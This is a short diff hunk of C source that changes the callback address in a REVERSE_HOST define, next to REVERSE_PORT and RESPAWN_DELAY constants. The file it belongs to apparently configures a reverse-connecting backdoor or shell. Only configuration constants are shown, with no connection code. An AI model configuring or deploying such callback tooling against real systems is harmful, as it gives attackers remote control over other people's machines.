@@ -38,7 +38,7 @@
 #include <signal.h>
 
 #ifdef STATIC
-# define REVERSE_HOST     "192.168.56.101"
+# define REVERSE_HOST     "192.168.56.1"
 # define REVERSE_PORT     5555
 # define RESPAWN_DELAY    15
 #else
